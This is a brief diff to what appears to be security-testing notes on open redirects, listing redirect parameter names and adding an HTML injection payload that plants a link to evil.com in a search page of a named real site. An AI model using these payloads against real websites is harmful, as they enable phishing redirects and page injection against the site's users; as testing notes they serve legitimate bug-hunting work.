@@ -13,6 +13,7 @@ url, redirect, redirect_uri, redirect_url, redirect_to, redir, rurl, destination
 
 
 https://example.com/login?redirect=https://evil.com
+https://games.crossfit.com/search?query=</title><a href=https://evil.com><h1>click here</h1></a>
 
 
 git clone https://github.com/Naategh/dom-red.git
